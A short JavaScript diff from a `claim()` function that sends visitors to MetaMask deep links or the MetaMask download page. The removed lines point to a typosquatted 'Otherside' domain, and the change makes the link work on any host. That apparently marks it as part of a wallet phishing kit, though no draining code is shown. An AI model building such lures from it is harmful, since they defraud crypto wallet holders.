@@ -245,16 +245,16 @@
 		}
 
 		async function claim() {
-			if(metamaskInstalled) {
+			if(!metamaskInstalled) {
 				if(isMobile()) {
 					Object.assign(document.createElement('a'), {
-    target: 'https://metamask.app.link/dapp/0thersidemeta.xyz/',
-    href: `https://metamask.app.link/dapp/0thersidemeta.xyz/${window.location.hostname}${window.location.pathname}`,
+    target: '_blank',
+    href: `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`,
   }).click();
 				} else {
 					  Object.assign(document.createElement('a'), {
     target: '_blank',
-    href: "https://metamask.app.link/dapp/0thersidemeta.xyz/",
+    href: "https://metamask.io/download/",
   }).click();
 				}
 				return;
